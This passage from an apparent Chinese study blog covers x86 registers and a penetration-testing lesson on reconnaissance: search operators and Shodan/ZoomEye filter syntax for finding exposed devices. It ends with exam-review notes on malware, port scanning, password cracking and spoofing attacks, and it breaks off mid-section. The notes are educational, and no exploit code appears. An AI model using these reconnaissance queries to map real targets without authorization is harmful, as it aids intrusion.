<p>上面介绍的<strong>4个寄存器</strong>是一类，叫做<code>系统地址寄存器</code>。其功能是用于<strong>存储操作系统需要的保护信息和地址转换表信息</strong>。关于<strong>GDT表和IDT表、LDT表</strong>的相关信息可以参考<a href="https://qidangge.github.io/2022/08/19/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F--%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86/">这一篇文章</a>。需要注意的是，上文4个<strong>系统地址寄存器</strong>中后两个<code>LDTR</code>和<code>TR</code>寄存器是<strong>16位</strong>的，其中存储的信息与CS等段寄存器一样为<strong>段选择子</strong>：<strong>用于在某表中根据索引查询到具体的段地址</strong>。</p>
<hr>
<p>寄存器还有很多，比如：<code>主存地址寄存器MAR</code>、<code>主存数据寄存器MDR</code>、<code>IO地址寄存器IOAR</code>、<code>IO数据寄存器IODR</code>等，还有很多<code>调试寄存器</code>、<code>测试寄存器</code>等，用途各不相同，后续<strong>使用到时</strong>再进行详细介绍。</p>
<hr>
<blockquote>
<p><strong>第二次更新</strong>：2022年11月9日，午。增加了一些寄存器，并区分了程序员可见、透明分类。</p>
<blockquote>
<p>更新原因：计组中在学习CPU时涉及到了更多的寄存器，所以加以补充。</p>
</blockquote>
</blockquote>
<p>注：上文已经较为详细的介绍了常见的寄存器，这里不再赘述。这里会从可见与透明的角度来分析这些寄存器。</p>
<h1 id="可见与透明寄存器"><a href="#可见与透明寄存器" class="headerlink" title="可见与透明寄存器"></a>可见与透明寄存器</h1><ul>
<li>用户（所有程序员）可见：PSW、通用寄存器、PC</li>
<li>用户（所有程序员）透明：MAR、MDR、IR、Cache、微程序的结构和功能</li>
<li>应用程序员透明：暂存寄存器、虚拟存储器</li>
<li>汇编程序员可见：PC</li>
<li>系统程序员可见：虚拟存储器</li>
</ul>
<h2 id="程序可见寄存器"><a href="#程序可见寄存器" class="headerlink" title="程序可见寄存器"></a>程序可见寄存器</h2><blockquote>
<p>程序可见寄存器，顾名思义，就是<strong>程序员可以直接使用相关指令进行访问</strong>的寄存器。比如通用寄存器组,可以使用mov指令进行赋值，可以使用add指令进行计算，就是程序可见寄存器。</p>
</blockquote>
<h2 id="程序不可见寄存器"><a href="#程序不可见寄存器" class="headerlink" title="程序不可见寄存器"></a>程序不可见寄存器</h2><p>处理器中有大量的程序不可见寄存器。比如AR地址寄存器、DR数据寄存器、IR指令寄存器等，都是用于程序控制的，程序员不可见。（引：再比如使用Tomasulo算法的陆续执行处理器，需要用到大量的队列和表格，体现在硬件实现上就是一大堆寄存器。而这些寄存器都是程序不可见的寄存器。）</p>
<h2 id="何以区分之"><a href="#何以区分之" class="headerlink" title="何以区分之"></a>何以区分之</h2><blockquote>
<p>引用之：<br>作者：王宇轩<br>链接：<a href="https://www.zhihu.com/question/378773699/answer/1075791022">https://www.zhihu.com/question/378773699/answer/1075791022</a><br>来源：知乎</p>
</blockquote>
<p>第一，<strong>没有必要</strong>。大部分程序员学习编程，根本就不需要了解这些寄存器，甚至不知道有这些寄存器的存在。程序员只需要使用通用寄存器堆就<strong>可以完成一切编程任务</strong>。对于那些程序不可见寄存器，哪个寄存器里存放了什么内容，这些数据有什么用，它们将要被谁读出，程序员并不知道也并不关心。</p>
<p>第二，<strong>过于危险</strong>。程序员如果能够随心所欲地运用代码访问这些程序不可见寄存器，会出现严重的安全问题。因为这些寄存器都是直接关系到处理器的执行过程，对这些值进行修改，就好比是运动员去修理裁判，造成处理器执行过程的混乱。甚至是仅仅读取这些寄存器也很危险，如果黑客通过某种方式读取了这些寄存器的值，就能够获取一些隐私信息，著名的硬件漏洞，熔断和幽灵指的就是这种行为。</p>
<p>第三，<strong>影响性能</strong>。程序员想要访问这些程序不可见寄存器，指令集务必做出调整，要么增加指令种类，要么增加寄存器编码的位数。增加指令种类务必会使译码(decode)过程更加复杂，从而必须降低时钟周期，处理器效率受到影响。甚至操作码位数可能会不够，增加了指令长度。指令长度增加会使代码规模大幅增长，严重地增加了存储负担。增加寄存器编码的位数首先会增加访问寄存器的时长，降低时钟周期。而且本来只需要4位二进制编码就可以区分通用寄存器组中的所有16个寄存器，现在要访问更多的寄存器自然就需要更多的编码，增加了指令长度，给存储带来负担。</p>
<p>所以，将大量的寄存器都设置为程序不可见寄存器是一件自然而然的事情，同时也是一件<strong>具有大智慧</strong>的事情。</p>
]]></content>
      <categories>
        <category>【-专业知识-】逆向工程知识</category>
        <category>汇编语言学习</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全技术--信息侦察</title>
    <url>/2023/03/10/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF--%E4%BF%A1%E6%81%AF%E4%BE%A6%E5%AF%9F/</url>
    <content><![CDATA[<h1 id="工具1：搜索引擎检索规则"><a href="#工具1：搜索引擎检索规则" class="headerlink" title="工具1：搜索引擎检索规则"></a>工具1：搜索引擎检索规则</h1><blockquote>
<p><strong>目的</strong>：通过在搜索引擎检索栏输入对应的指令可以进行高级搜索，以获取更加精确的搜索结果。 </p>
</blockquote>
<blockquote>
<p>下面是<strong>常用的检索规则汇总</strong>：</p>
</blockquote>
<ul>
<li><code>site:[域]</code><ul>
<li>用途：返回与<strong>特定域相关</strong>的检索结果；</li>
<li>示例：site:guet.edu.cn 考试 （在guet.edu.cn域中查找含有“考试”的结果）。</li>
</ul>
</li>
<li><code>link:[Web页面]</code><ul>
<li>用途：给出和<strong>指定Web页面相链接</strong>的站点，可能泄露目标站点的业务关系；</li>
<li>示例：link:guet.edu.cn （查看和guet.edu.cn相链接的所有站点）</li>
</ul>
</li>
<li><code>intitle:[条件]</code><ul>
<li>用途：用于检索<strong>标题中含有特定检索文本</strong>的页面。</li>
<li>示例：site:guet.edu.cn intitle: 徐华蕊 (查看guet.edu.cn站点中标题是否包含有“徐华蕊”的网页)。</li>
</ul>
</li>
<li><code>related:[站点]</code></li>
<li>用途：显示<strong>与特定的检索页面类似</strong>的Web页面；</li>
<li>示例：related:guet.edu.cn。</li>
<li><code>cache:[页面]</code><ul>
<li>用途：显示来自于<strong>Baidu快照的页面内容</strong>。对于查找最近被移出或当前不可用的页面时非常有用；</li>
<li>示例：<code>cache:www.csdn.net</code> （查找www. csdn.net中最近被Baidu bot抓取的页面）。</li>
</ul>
</li>
<li><code>filetype:[后缀]</code><ul>
<li>用途：检索<strong>特定类型的文件</strong>；</li>
<li>示例：filetype:ppt site:www .csdn.net （查找ww w.csdn.net中所有的ppt文件）</li>
</ul>
</li>
<li><code>Not（－）</code><ul>
<li>用途：过滤Web页面中所包含的特定条件；</li>
<li>示例：苹果 –水果。</li>
</ul>
</li>
<li><code>Plus（+）</code><ul>
<li>用途：告诉Baidu<strong>不应该把某个词过滤掉</strong>（注意：不是告诉Baidu所有的页面都要包含某个条件）；</li>
<li>示例：site:ww w.csdn.net +how +the。</li>
</ul>
</li>
</ul>
<p><strong>一个实例</strong>：搜索引擎获取 4399游戏中带有“造梦西游”的网页？</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1678445871698.png"></p>
<h1 id="工具2：Shodan与ZoomEy"><a href="#工具2：Shodan与ZoomEy" class="headerlink" title="工具2：Shodan与ZoomEy"></a>工具2：Shodan与ZoomEy</h1><blockquote>
<p><strong>目的</strong>：获取<strong>联网设备信息</strong></p>
</blockquote>
<blockquote>
<p>常用网站：</p>
</blockquote>
<ol>
<li><a href="https://www.shodan.io/">Shodan网站</a></li>
<li><a href="https://www.zoomeye.org/">ZoomEy网站</a></li>
</ol>
<blockquote>
<p><strong>检索过滤规则</strong>：以钟馗之眼为例</p>
</blockquote>
<ul>
<li>搜索范围覆盖设备(IPv4、IPv6)及网站(域名)，可以<strong>提交URL参数 t</strong> 进行指定类型 t&#x3D;v4为 IPv4，t&#x3D;v6为 IPv6，t&#x3D;web为域名（或可通过搜索结果侧栏点击对应搜索内容）</li>
<li>直接输入搜索字符串会认定为“全局”进行匹配搜索关键词，会从http等协议内容(包括http头、html内容等)、ssl证书、组件名等进行匹配搜索。</li>
<li>搜索字符串<strong>不区分大小写</strong>，会进行分词后匹配(搜索结果页面提供了“分词”测试功能)</li>
<li>搜索<strong>字符串请使用引号</strong>（如”Cisco Systems”或’Cisco Systems’）， 如不然空格会认定为逻辑 or 运算符，如果搜索字符串里存在引号可以使用 \ 进行转义 比如: “a&quot;b”,如果搜索字符串里存在括号可以使用 \ 进行转义 比如: portinfo()</li>
</ul>
<p><strong>逻辑运算：</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1678446225264.png"></p>
<p><strong>地理位置</strong>：</p>
<ul>
<li><code>country</code>:”CN”<ul>
<li>搜索<strong>国家地区</strong>资产</li>
<li>可以使用国家缩写，也可以使用中&#x2F;英文全称如country:”中国”country:”china”</li>
</ul>
</li>
<li><code>subdivisions</code>:”beijing”<ul>
<li>搜索相关<strong>指定行政区</strong>的资产</li>
<li>中国省会支持中文及英文描述搜索如subdivisions:”北京”subdivisions:”beijing”</li>
</ul>
</li>
<li><code>city</code>:”changsha”<ul>
<li>搜索<strong>相关城市资产</strong></li>
<li>中国城市支持中文及英文描述搜索如city:”changsha”city:”长沙”</li>
</ul>
</li>
</ul>
<p><strong>证书搜索</strong>：</p>
<ul>
<li><code>ssl</code>:”google”<ul>
<li>搜索ssl证书存在”google”字符串的资产</li>
<li>常常用来<strong>提过产品名及公司名</strong>搜索对应目标</li>
</ul>
</li>
<li><code>ssl.cert.availability</code>:1<ul>
<li>搜索证书是否在有效期内</li>
<li>证书在有效期内ssl.cert.availability:1</li>
<li>证书不在有效期内ssl.cert.availability:0</li>
</ul>
</li>
<li><code>ssl.cert.fingerprint</code>:”F3C98F223D82CC41CF83D94671CCC6C69873FABF”<ul>
<li>搜索证书相关指纹资产</li>
</ul>
</li>
<li><code>ssl.chain_count</code>:3<ul>
<li>搜索<strong>ssl链计数资产</strong></li>
</ul>
</li>
<li><code>ssl.cert.alg</code>:”SHA256-RSA”<ul>
<li>搜索证书支持的<strong>签名算法</strong></li>
</ul>
</li>
<li><code>ssl.cert.issuer.cn</code>:”pbx.wildix.com”<ul>
<li>搜索用户证书签发者通用域名名称</li>
</ul>
</li>
<li><code>ssl.cert.pubkey.rsa.bits</code>:2048<ul>
<li>搜索rsa_bits证书公钥位数</li>
</ul>
</li>
<li><code>ssl.cert.pubkey.ecdsa.bits</code>:256</li>
<li>搜索ecdsa_bits证书<strong>公钥位数</strong></li>
<li><code>ssl.cert.pubkey.type</code>:”RSA”<ul>
<li>搜索证书的<strong>公钥类型</strong></li>
</ul>
</li>
<li><code>ssl.cert.serial</code>:”18460192207935675900910674501”<ul>
<li>搜索<strong>证书序列号</strong></li>
</ul>
</li>
<li><code>ssl.cipher.bits</code>:”128”<ul>
<li>搜索<strong>加密套件位数</strong></li>
</ul>
</li>
<li><code>ssl.cipher.name</code>:”TLS_AES_128_GCM_SHA256”</li>
<li>搜索加密套件名称</li>
<li><code>ssl.cipher.version</code>:”TLSv1.3”</li>
<li>搜索加密套件版本</li>
<li><code>ssl.version</code>:”TLSv1.3”<ul>
<li>搜索证书的ssl版本</li>
</ul>
</li>
<li><code>ssl.cert.subject.cn</code>:”baidu.com”<ul>
<li>搜索用户证书持有者通用域名名称</li>
</ul>
</li>
</ul>
<p><strong>ip及域名相关信息：</strong></p>
<ul>
<li><code>ip</code>:”8.8.8.8”<ul>
<li>搜索指定<strong>IPv4地址</strong>相关资产</li>
</ul>
</li>
<li><code>ip</code>:”2600:3c00::f03c:91ff:fefc:574a”<ul>
<li>搜索指定<strong>IPv6地址</strong>相关资产</li>
</ul>
</li>
<li><code>cidr</code>:52.2.254.36&#x2F;24<ul>
<li>搜索<strong>IP的C段资产</strong></li>
<li>cidr:52.2.254.36&#x2F;16 为IP的B段资产 cidr:52.2.254.36&#x2F;8 为IP的A段资产,如cidr:52.2.254.36&#x2F;16cidr:52.2.254.36&#x2F;8</li>
</ul>
</li>
<li><code>org</code>:”北京大学” 或者organization:”北京大学”<ul>
<li>搜索<strong>相关组织</strong>(Organization)的资产</li>
<li>常常用来定位大学、结构、大型互联网公司对应IP资产</li>
</ul>
</li>
<li><code>isp</code>:”China Mobile”<ul>
<li>搜索相关<strong>网络服务提供商</strong>的资产</li>
<li>可结合org数据相互补充</li>
</ul>
</li>
<li><code>asn</code>:42893<ul>
<li>搜索对应<strong>ASN（Autonomous system number）自治系统</strong>编号相关IP资产</li>
</ul>
</li>
<li><code>port</code>:80<ul>
<li>搜索相关<strong>端口资产</strong></li>
<li>目前不支持同时开放多端口目标搜索</li>
</ul>
</li>
<li><code>hostname</code>:google.com<ul>
<li>搜索相关IP”主机名”的资产</li>
</ul>
</li>
<li><code>site</code>:baidu.com<ul>
<li>搜索<strong>域名相关</strong>的资产</li>
<li>常常使用来搜索子域名匹配</li>
</ul>
</li>
</ul>
<p><strong>指纹相关：</strong></p>
<ul>
<li><code>app</code>:”Cisco ASA SSL VPN”<ul>
<li>搜索<strong>思科ASA-SSL-VPN</strong>的设备</li>
<li>更多的app规则请参考”导航”，在搜索框输入cisco等关键词会有相关app提示</li>
</ul>
</li>
<li><code>service</code>:”ssh”<ul>
<li>搜索<strong>对应服务协议</strong>的资产</li>
<li>常见服务协议包括：http、ftp、ssh、telnet等等(其他服务可参考搜索结果域名侧栏聚合展示)</li>
</ul>
</li>
<li><code>device</code>:”router”<ul>
<li>搜索<strong>路由器相关</strong>的设备类型</li>
<li>常见类型包括router(路由器)、switch(交换机)、storage-misc(存储设备)等等(其他类型可参考搜索结果域名侧栏聚合展示)</li>
</ul>
</li>
<li><code>os</code>:”RouterOS”<ul>
<li>搜索<strong>相关操作系统</strong></li>
<li>常见系统包括Linux、Windows、RouterOS、IOS、JUNOS等等(其他系统可参考搜索结果域名侧栏聚合展示)</li>
</ul>
</li>
<li><code>title</code>:”Cisco”<ul>
<li>搜索html<strong>内容里标题</strong>中存在”Cisco”的数据</li>
</ul>
</li>
<li><code>industry</code>:”政府”<ul>
<li>搜索<strong>行业类型相关</strong>的资产</li>
<li>常见的行业类型包括科技、能源、金融制造业等等（其他类型可结合org数据相互补充）</li>
</ul>
</li>
</ul>
<p><strong>时间节点：</strong></p>
<ul>
<li><code>after</code>:”2020-01-01” +port:”50050”<ul>
<li>搜索更新时间为”2020-01-01”端口为”50050”以后的资产</li>
<li>时间过滤器需组合其他过滤器使用</li>
</ul>
</li>
<li><code>before</code>:”2020-01-01” +port:”50050”<ul>
<li>搜索更新时间在”2020-01-01”端口为”50050”以前的资产</li>
<li>时间过滤器需组合其他过滤器使用</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>实例</strong>：搜索中国2023年3月9日安装Linux系统的主机信息？</p>
</blockquote>
<p>使用检索指令：<code>os:&quot;Linux&quot;+after:&quot;2023-03-10&quot;+country:&quot;CN&quot;</code></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1678455015181.png"></p>
<h1 id="工具3：Whois查询"><a href="#工具3：Whois查询" class="headerlink" title="工具3：Whois查询"></a>工具3：Whois查询</h1><blockquote>
<p><strong>目的</strong>：可以获取到<strong>域名的注册资料</strong>等相关信息</p>
</blockquote>
<blockquote>
<p><strong>两个网站</strong>：</p>
</blockquote>
<ol>
<li>138搜索网（国际版）</li>
<li><a href="https://whois.domaintools.com/">https://whois.domaintools.com/</a></li>
</ol>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>系统安全复习</title>
    <url>/2023/11/08/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="第一章-信息系统安全威胁"><a href="#第一章-信息系统安全威胁" class="headerlink" title="第一章 信息系统安全威胁"></a>第一章 信息系统安全威胁</h1><h2 id="恶意代码攻击"><a href="#恶意代码攻击" class="headerlink" title="恶意代码攻击"></a>恶意代码攻击</h2><blockquote>
<p><strong>复习建议：这一节很重要，要对这三种攻击的概念、原理、比较等熟悉。</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677682112868.png"></p>
<blockquote>
<p>计算机病毒：基本概念、特征、分类、原理；案例</p>
</blockquote>
<ul>
<li><strong>基本概念</strong>：利用软硬件缺陷，破坏计算机数据并影响计算机正常工作的一组<strong>指令集或程序代码</strong>。<br><strong>注</strong>：凡是能够引起计算机故障，破坏计算机数据的<strong>程序</strong>都可称为计算机病毒。</li>
<li><strong>特性</strong>：<ul>
<li><strong>非授权执行性与寄生性</strong></li>
<li>传染性</li>
<li>潜伏与隐蔽性</li>
<li><strong>可触发性</strong></li>
<li>破坏性</li>
</ul>
</li>
<li><strong>分类</strong>：（以寄生位置）<ul>
<li>引导型病毒：寄生在引导扇区</li>
<li>文件病毒：寄生在文件</li>
<li>引导兼文件病毒</li>
<li>CMOS 病毒：寄生在CMOS空间（保存系统参数和配置）</li>
</ul>
</li>
<li><strong>原理</strong>：计算机病毒的基本原理是通过<strong>自我复制</strong>来感染其他程序或系统。分为<code>潜伏、感染、触发、发作</code>四个状态。</li>
<li><strong>防御措施</strong>：<ul>
<li>强化安全管理</li>
<li>计算机病毒检测</li>
<li>计算机病毒的清除</li>
<li>病毒防治软件</li>
</ul>
</li>
</ul>
<blockquote>
<p>蠕虫：基本概念、特征、传播过程；案例</p>
</blockquote>
<ul>
<li><p><strong>基本概念</strong>：可以<strong>独立存在</strong>并且从<strong>一个计算机传播到另一个计算机</strong>的程序。<br><strong>注</strong>：蠕虫是一种自我复制的恶意程序，它可以自动<strong>在网络上寻找漏洞</strong>并利用漏洞进行传播。以这个概念看，蠕虫也是广义病毒的一种。</p>
</li>
<li><p><strong>特征</strong>：</p>
<ul>
<li><strong>存在的独立性</strong></li>
<li>攻击的对象是计算机</li>
<li>攻击的主动性</li>
<li>传染的反复性</li>
<li>行踪的隐蔽性 </li>
<li>破坏的严重性</li>
</ul>
</li>
<li><p><strong>传播过程</strong>：</p>
<p> 先探测、再扫描、再攻击、再感染、最后发挥作用（有效载荷）<br> <img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677721588114.png"></p>
</li>
<li><p><strong>案例</strong>：</p>
<ul>
<li>红色代码病毒：结合了病毒、木马、DDOS机制的蠕虫。</li>
<li>熊猫烧香：被感染的用户系统中所有.exe可执行文件全部被改成熊猫举着三根香的模样</li>
</ul>
</li>
</ul>
<p><strong>比较一下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677721876754.png"></p>
<p>病毒和蠕虫的区别可以从<strong>存在方式、传播方式、感染目标</strong>出发去记忆。</p>
<blockquote>
<p>木马：基本概念、特征、传播过程；案例</p>
</blockquote>
<ul>
<li><strong>基本概念</strong>：特洛伊木马程序<strong>是一种恶意程序</strong>，它能提供一些有用的或者令人感兴趣的功能，但是还具有用户不知道的其他功能。</li>
<li><strong>特征</strong>：<ul>
<li>易传播性</li>
<li>隐蔽性</li>
<li>顽固性</li>
<li>有效性</li>
</ul>
</li>
<li>传播过程：<ul>
<li>木马<strong>没有自传播</strong>功能，其传播的基本方式是<strong>植入</strong>。总体而言，木马可以采用<strong>手工植入和远程植入</strong>两种方式。</li>
</ul>
</li>
<li><strong>案例</strong>：<ul>
<li><strong>Zeus木马</strong>： Zeus是一种盗窃银行账户信息的木马程序。它通过社交工程的方式欺骗用户下载并安装木马，一旦感染成功，它会记录受害者在浏览器中输入的所有账户信息和密码，并将这些信息发送到攻击者的服务器上。</li>
</ul>
</li>
</ul>
<p><strong>比较一下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677722221727.png"></p>
<p>重点关注下标红部分。</p>
<blockquote>
<p>陷门与黑客攻击（简单看下即可）</p>
</blockquote>
<p><strong>陷门</strong>（trap doors）也称“后门”， 是一种利用系统脆弱性进行重复攻击的技术，通常是一段非法的操作系统程序，通过它可以在一个程序模块中留下未被登记的秘密入口，使用户可以不按正常的访问步骤获得访问权。</p>
<p>“<strong>黑客</strong>”对于网络攻击者的统称。一般说来，黑客是一个精通计算机技术的特殊群体。从攻击的动机看，可以把“黑客”分为3类：一类称为“侠客（Hackers）”，他们多是好奇者和爱出风头者；一类称为“骇客（Crackers）”，他们是一些不负责的恶作剧者；一类称为“入侵者（Intruder），他们是有目的的破坏者。</p>
<h2 id="窃听"><a href="#窃听" class="headerlink" title="窃听"></a>窃听</h2><blockquote>
<p><strong>复习建议：这一节不重要，了解一下简单的案例即可。</strong></p>
</blockquote>
<p>窃听攻击属于<strong>被动攻击</strong>，不会修改原有信息。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677722965969.png"></p>
<h2 id="系统扫描"><a href="#系统扫描" class="headerlink" title="系统扫描"></a>系统扫描</h2><blockquote>
<p><strong>复习建议：重点章节。知道概念、可以用自己的话说出来。</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677722570612.png"></p>
<h3 id="地址扫描"><a href="#地址扫描" class="headerlink" title="地址扫描"></a>地址扫描</h3><blockquote>
<p><strong>ping命令</strong>：利用<strong>ICMP报文</strong>进行主机探测</p>
</blockquote>
<blockquote>
<p><strong>tracert命令</strong>：是<strong>路由跟踪</strong>实用程序，用于确定 IP数据包访问目标所<strong>采取的路径</strong>。</p>
</blockquote>
<blockquote>
<p><strong>pathping命令</strong>：综合上两个指令。</p>
</blockquote>
<blockquote>
<p><strong>netstat命令</strong>：访问<strong>网络连接状态及其相关信息</strong>的程序，一般用于检验本机<strong>各端口</strong>的网络连接情况</p>
</blockquote>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677723021385.png"></p>
<blockquote>
<p><strong>全连接扫描</strong>（TCP connect扫描）：利用TCP三次握手全过程。这种扫描往往会被远程<strong>系统记入日志</strong>。</p>
</blockquote>
<blockquote>
<p><strong>半连接扫描</strong>（TCP SYN扫描）：当客户端发出一个SYN连接请求报文后，如果收到了远程目标主机的ACK&#x2F;SYN确认，就说明远程主机的该端口是打开的。<strong>信息足够</strong>并且<strong>不会</strong>在目标主机的日志中<strong>留下记录</strong>。</p>
</blockquote>
<blockquote>
<p><strong>TCP FIN 扫描</strong>：<strong>关闭端口</strong>会用适当的<strong>RST</strong>来回复FIN数据包，<strong>打开端口</strong>时会<strong>忽略</strong>对FIN数据包的回复。</p>
</blockquote>
<p><strong>注1</strong>：有的系统无论端口开放与否都会返回RST回复，<strong>不适用</strong>；</p>
<p><strong>注2</strong>：该扫描方法比SYN扫描<strong>更隐蔽</strong>，不会记录日志，也叫秘密扫描</p>
<p><strong>注3</strong>：该方法还可以<strong>区分系统</strong>（UNIX or WIN），因为该方法对WindowsNT无效，只适用于UNIX主机。</p>
<blockquote>
<p><strong>TCP NULL 扫描</strong> ：程序发送一个<strong>没有任何标志位</strong>的TCP包，<strong>关闭的端口</strong>将返回一个RST数据包。 </p>
</blockquote>
<blockquote>
<p><strong>UDP ICMP端口不能到达扫描</strong>：使用的是<strong>UDP协议</strong>，而非TCP&#x2F;IP协议。由于UDP协议很简单，所以扫描变得相对比较困难。在向一个<strong>未打开的UDP端口发送数据包</strong>时，会<strong>返回一个ICMP_PORT_UNREACH错误</strong>，这样扫描者就能知道哪个端口是关闭的。</p>
</blockquote>
<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>漏洞扫描是指<strong>基于漏洞数据库</strong>，通过扫描等手段对指定的远程或者本地计算机系统的<strong>安全脆弱性</strong>进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。</p>
<p>攻击者和防守者都可以利用。</p>
<h3 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h3><blockquote>
<p>口令机制是<strong>资源访问的第一道屏障</strong>。攻破了这到屏障，就获得了进入系统的第一道大门。 </p>
</blockquote>
<blockquote>
<p><strong>字典攻击</strong>：攻击者基于某些知识，编写出口令字典，然后对字典进行<strong>穷举或猜测</strong></p>
</blockquote>
<p><strong>字典</strong>：一些单词或者字母和数字的组合</p>
<p><strong>防止字典攻击的方法</strong>：使用带有特殊字符的密码，密码不是有规律的英语单词</p>
<blockquote>
<p><strong>社会工程学</strong>：通过对目标系统的人员进行<strong>游说、欺骗、利诱</strong>，获得口令或部分。</p>
</blockquote>
<blockquote>
<p><strong>在线与离线</strong>：</p>
</blockquote>
<p><strong>在线</strong>：在线登录目标主机，通过程序循环输入密码尝试正确的密码输入。<strong>有日志记录</strong><br><strong>离线</strong>：取得目标主机的密码文件，然后在本地破解。<strong>花费时间长</strong>。</p>
<h2 id="欺骗型攻击"><a href="#欺骗型攻击" class="headerlink" title="欺骗型攻击"></a>欺骗型攻击</h2><blockquote>
<p><strong>复习建议：很重要，理解ARP欺骗、DNS欺骗的含义和流程。</strong></p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677723843913.png"></p>
<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><blockquote>
<p><strong>ARP协议</strong>：将32位的IP地址翻译成48位MAC地址的协议</p>
</blockquote>
<blockquote>
<p><strong>ARP欺骗的原理</strong>：因为ARP协议是一个<strong>无状态的协议</strong>，一旦收到ARP应答报文就会修改缓存表（IP-MAC映射表）。</p>
</blockquote>
<blockquote>
<p><strong>ARP欺骗的流程</strong>：攻击者通过向已知IP地址的目标主机发送ARP应答报文（<strong>包含伪造的IP-MAC映射信息</strong>），以修改其缓存信息。</p>
</blockquote>
<blockquote>
<p><strong>中间人攻击</strong>：使进行监听的主机插入到被监听主机和其他主机之间，利用ARP欺骗进行攻击，造成监听主机成为被监听主机和其他主机通信的中继。</p>
</blockquote>
<blockquote>
<p><strong>防护措施</strong>：静态ARP（不会更新缓存）、ARP监听检测（检测缓存变化）、数据加密（防窃听）</p>
</blockquote>
<h3 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h3><blockquote>
<p><strong>域名系统</strong>（Domain Name System, DNS）是一个将<strong>主机域名和IP地址互相映射</strong>的数据库系统。</p>
</blockquote>
<blockquote>
<p><strong>DNS协议工作原理</strong> :<br>在<strong>DNS服务器</strong>中主要存放着计算机的<strong>域名和IP地址相关联的数据库</strong>。DNS服务器在收到传来的网址以后，首先查询本地的数据库，查看数据库中是否有和该网址对应的记录。</p>
</blockquote>
<blockquote>
<p><strong>DNS欺骗流程</strong>：</p>
</blockquote>
<p>先伪造一个<strong>DNS请求</strong>—再伪造一个<strong>查询应答</strong>，以改变DNS服务器的高速缓存信息。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677724655607.png"></p>
<h3 id="Web欺骗"><a href="#Web欺骗" class="headerlink" title="Web欺骗"></a>Web欺骗</h3><blockquote>
<p>Web欺骗的攻击者会创建<strong>整个WWW世界的影像拷贝</strong>。用户进入该影像Web的入口，实际是进入到<strong>攻击者的Web服务器</strong>。此时，攻击者就可以肆意实施攻击。</p>
</blockquote>
<p><strong>三个基本原理</strong>：</p>
<ul>
<li>注册域名没有要求</li>
<li>Cookie欺骗</li>
<li>Session欺骗</li>
</ul>
<blockquote>
<p>练习题：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677736490368.png"></p>
<h2 id="数据驱动型攻击"><a href="#数据驱动型攻击" class="headerlink" title="数据驱动型攻击"></a>数据驱动型攻击</h2><blockquote>
<p><strong>复习建议：简单了解一下即可</strong></p>
</blockquote>
<blockquote>
<p>缓冲区溢出攻击</p>
</blockquote>
<p><strong>缓冲区</strong>（buffer）是内存中存放计算机正在处理数据的地方。</p>
<p>当数据量超过缓冲区长度时，多出的数据就会破坏堆栈中的数据，从而导致<strong>系统故障</strong>；同时可以在溢出数据中加上<strong>精心构造的机器代码</strong>从而实现预订的攻击效果。</p>
<blockquote>
<p>格式化字符串攻击</p>
</blockquote>
<p><strong>格式化字符串攻击</strong>是利用程序中的一些需要<strong>指定用户输入格式</strong>，却没有严格制定用户格式的<strong>函数</strong>，通过提交特殊的格式字符串进行攻击。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677725030529.png"></p>
<h2 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h2><blockquote>
<p><strong>复习建议：重点部分，要理解含义和几个例子。</strong></p>
</blockquote>
<blockquote>
